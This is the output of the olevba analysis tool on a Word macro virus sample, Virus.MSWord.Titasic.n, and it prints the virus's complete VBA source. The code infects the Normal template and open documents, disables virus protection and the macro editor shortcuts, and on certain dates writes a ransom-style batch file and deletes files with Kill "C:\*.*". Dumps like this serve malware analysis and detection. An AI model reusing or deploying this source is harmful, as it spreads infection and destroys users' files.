olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Brando_A.bas 
in file: Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe - OLE stream: 'Macros/VBA/Brando_A'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public DocActive
    Public lanjutan
        Public aLen
            Public hapus
                Public reset
                    Public Auto
                        Public ActivDoc
                            Public Const strPESAN = "Cyber Millenium by IfTä"
                                Public Const strONOFF = "A,C,D"
Sub BMM1(fFile)
Dim nInit As Object
    For Each nInit In fFile. _
        VBProject.VBComponents
            If nInit.Name <> "ThisDocument" _
              And nInit.Name <> "Brando_A" _
                And nInit.Name <> "hack" Then
                    hapus = True
                If reset Then
            Application.OrganizerDelete _
        fFile.FullName, nInit.Name, _
    wdOrganizerObjectProjectItems
Else
nInit.CodeModule.DeleteLines 1, _
    nInit.CodeModule.CountOfLines
        End If
            End If
Next nInit
End Sub
Sub FileOpen()
WordBasic.disableautomacros True
    If Dialogs(80).Show <> 0 Then
        WordBasic.disableautomacros False
            AutoOpen
                Else
                    WordBasic.disableautomacros False
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = _
    wdCancelDisabled
      BMM
            If Documents.Count > 1 Then
                For i = 1 To Documents.Count
                    If Documents(i).Name <> _
                ActiveDocument.Name Then
            Set AD = Documents(i)
        ActiveDoc = True
    hapus = False
BMM
    End If
        Next
            End If
            End
End Sub
Sub ViewVbCode()
If MsgBox(" Not enough memory !", _
    vbCritical + vbOKOnly) _
        = vbOK Then
    End If
End Sub
Function BMM()
Dim nInit(1) As String
    Dim TempNormal As Object
       Dim Nmacr$
        On Error Resume Next
            BMM3
On Error GoTo selesai
    nInit(0) = "Brando_A"
nInit(1) = "hack"
    Nmacr = MacroContainer
        Set TempNormal = NormalTemplate
            If Not ActivDoc Then
                Set DocActive = ActiveDocument
                    ElseIf Nmacr <> "Professional Letter.dot" Then
                        Nmacr = TempNormal
                    End If
                If Nmacr = TempNormal Then
            Nmacr = TempNormal.FullName: Set lanjutan = _
        DocActive
    ElseIf Nmacr = DocActive Then
Nmacr = DocActive.FullName: Set lanjutan = _
    TempNormal
        ElseIf Nmacr = "Professional Letter.dot" Then
            Set lanjutan = TempNormal
                Nmacr = Options.DefaultFilePath(8) _
                    & "\Professional Letter.Gra"
                        End If
                    BMM1 lanjutan
                With lanjutan.VBProject
        If Not (Not hapus And .Description = _
    "Brando_A" And .VBComponents.Count > 2) _
Then
BMM2 Nmacr, lanjutan, nInit
    hapus = False
        .Description = "Brando_A"
    If lanjutan = TempNormal Then
Options.SaveInterval = 1
    CustomizationContext = TempNormal
        CommandBars("Tools").reset
            FindKey(BuildKeyCode _
                (wdKeyF11, wdKeyAlt)).Disable
                    FindKey _
                (BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
            On Error GoTo 0
        lanjutan.Save
    End If
Else
    End If
End With
    Asm
selesai:
End Function
Sub BMM2(fFile, Dfile, nInit)
Dim Nmacr
    For Each Nmacr In nInit
        Application.OrganizerCopy _
            fFile, Dfile.FullName, Nmacr, _
                wdOrganizerObjectProjectItems
                    Next
                        End Sub
Function Dat()
Application.DisplayAlerts = wdAlertsAll
    Open "c:\Bacalah.bat" For Output As #2
        Write #2, "::" + Chr(13) + Chr(10) + "@Echo off" + Chr(13) + Chr(10) + "Cls" _
            + Chr(13) + Chr(10) + "If Exist c:\Bacalah.bat" _
                + Chr(13) + Chr(10) + "Echo." + Chr(13) + Chr(10) + "Echo." + Chr(13) + Chr(10) + _
"Echo                 ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»" + Chr(13) + Chr(10) + _
"Echo                 º          Welcome to IfTa Virus  0.3         º" + Chr(13) + Chr(10) + _
"Echo                 º         Your Computer Infected Virus.       º" + Chr(13) + Chr(10) + _
"Echo                 º      How Did That Happen to Come About ?    º" + Chr(13) + Chr(10) + _
"Echo                 º                  Call Me                    º" + Chr(13) + Chr(10) + _
"Echo                 º              Ifta@MailCity.Com              º" + Chr(13) + Chr(10) + _
"Echo                 ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼" + Chr(13) + Chr(10) + _
    "Echo." + Chr(13) + Chr(10) + "::"
Close #2
    End Function
Sub AutoSave()
On Error GoTo Chr
       BMM
        Err
           Application.DisplayAlerts = wdAlertsAll
                 Set AD = ActiveDocument
                 If ActiveDocument.Saved = True Then
                    AD.SaveAs FileName:=AD.Name, _
                        FileFormat:=wdFormatDocument
            End If
Chr:
End Sub
Sub AutoExec()
On Error Resume Next
    If MacroContainer <> _
        NormalTemplate Then
            Auto = True
                BMM
            WordBasic.disableautomacros True
        AddIns.Unload False
    WordBasic.disableautomacros False
End If
    Application.EnableCancelKey = _
        wdCancelDisabled
            End Sub
Function BMM3()
On Error GoTo Initis
    Dim Nmacr$
        Kill Options.DefaultFilePath(8) _
            & "\SNrml.dot"
        Application.NormalTemplate.Saved = True
    Kill Options.DefaultFilePath(10) _
    & "\SNrml.src"
Initis:
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
    BMM
          With Options
                .SaveNormalPrompt = False
                    .SaveInterval = 3
                .VirusProtection = False
            End With
        If InStr(1, ActiveDocument.Name, "Docume", 1) = _
    0 And ActiveDocument.Name <> "Professional Letter.dot" Then
BMM
    ActiveDocument.SaveAs FileName:=ActiveDocument. _
        Name, FileFormat:=wdFormatDocument
            End If
                End Sub
Sub AutoExit()
Dim aAddin As Object
    On Error GoTo batal
        WordBasic.disableautomacros True
            If Documents.Count <> 0 Then Documents.Close
                Options.DefaultFilePath(2) = _
                    Options.DefaultFilePath(6)
                        ptk = True
                    For Each aAddin In AddIns
                If aAddin.Name = _
            "Professional Letter.dot" Then ptk = False
        Next aAddin
    If ptk = True Then
Application.Visible = False
    Documents.Add
        BMM
             With ActiveDocument
                    .SaveAs FileName:=Options.DefaultFilePath(8) _
                        & "\Professional Letter.Gra", FileFormat:= _
                    wdFormatDocument, AddToRecentFiles:=False
                .SaveAs FileName:=Options.DefaultFilePath(8) _
            & "\Professional Letter.dot", FileFormat:= _
        wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WordBasic.disableautomacros False
End Sub
Function Err()
On Error Resume Next
    If Now > Day(Now) = 6 Then GoTo Error
        If Month(Now) = 1 Then GoTo AksiA
            If Month(Now) = 2 Then GoTo AksiA
                If Month(Now) = 3 Then GoTo AksiA
                    If Month(Now) = 4 Then GoTo AksiA
                If Month(Now) = 5 Then GoTo AksiA
            If Month(Now) = 6 Then GoTo AksiA
        If Month(Now) = 7 Then GoTo AksiA
    If Month(Now) = 8 Then GoTo AksiA
If Month(Now) = 9 Then GoTo AksiA
    If Month(Now) = 10 Then GoTo AksiB
        If Month(Now) = 11 Then GoTo AksiA
            If Month(Now) = 12 Then GoTo AksiA
    GoTo EndAksi
Error:
    GoTo EndAksi
AksiA:
    If Day(Now) = 6 Then Gbr
AksiB:
    If Day(Now) = 14 Then Pas
EndAksi:
End
End Function
Sub ToolsMacro()
On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
        CustomizationContext = NormalTemplate
            WordBasic.disableautomacros False
                BMM1 ActiveDocument
                    End Sub
Sub ToolsOptions()
    Options.DefaultFilePath(wdUserTemplatesPath) = _
        "C:\Program Files\Microsoft Office\Templates"
            Dialogs(wdDialogToolsOptions).Show
                Options.DefaultFilePath(wdUserTemplatesPath) = _
                    Application.Path
                        End Sub
Function Asm()
    reset = True
        FileTemplates
            BMM1 lanjutan
                End Function
Sub FileTemplates()
    WordBasic.disableautomacros False
        If Not reset Then Dialogs(87).Display
            End Sub
Function Init()
    hack.Show
        End Function
Sub FileExit()
    AutoExit
        End Sub
Sub FileSave()
    AutoSave
        End Sub
Sub FileClose()
    AutoClose
        End Sub
Function Pas()
    MsgBox "Don't let our differences come between us. " & Application.ActiveDocument.Name, vbOKOnly + vbSystemModal, "Microsoft Word"
      Dat
        Init
           Kill "C:\*.*"
             End Function
Function Gbr()
    MsgBox "He came out with a new play.", vbOKOnly + vbSystemModal, "Microsoft Word"
       Dat
         Init
            Kill "C:\*.*"
              End Function
-------------------------------------------------------------------------------
VBA MACRO hack.frm 
in file: Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe - OLE stream: 'Macros/VBA/hack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Welcome 3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSOD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
There's no getting away from 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IfT� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Virus Macro "99"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
People can sey what they like, If you don't like it, 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
You cant leave it !
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I don't know what to make of this ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
and �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IFTA{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MailCity�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.Com{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ift� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Virus
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Macro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Exit�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame3'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Titasic.n-8ca8f3f1417e92dffb36b1a0fbddf0b533ea79fe' - OLE stream: 'Macros/hack/i05/i01/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Bacalah.bat         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

